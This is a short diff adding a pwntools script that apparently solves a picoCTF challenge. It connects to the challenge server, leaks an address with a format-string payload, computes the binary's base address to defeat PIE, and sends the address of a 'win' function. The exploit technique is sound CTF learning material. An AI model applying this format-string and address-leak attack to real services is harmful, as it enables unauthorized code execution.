@@ -1,0 +1,10 @@
+from pwn import *
+exe = context.binary = ELF("./vuln")
+r = process()
+r = remote("rescued-float.picoctf.net",64760)
+r.sendline("%19$p")
+r.recvuntil(b"Enter your name:")
+leak_main = int(r.recvline().strip().decode(),16)
+exe.address = leak_main - (exe.sym['main'] + 65)
+r.sendline(hex(exe.sym['win']))
+r.interactive()
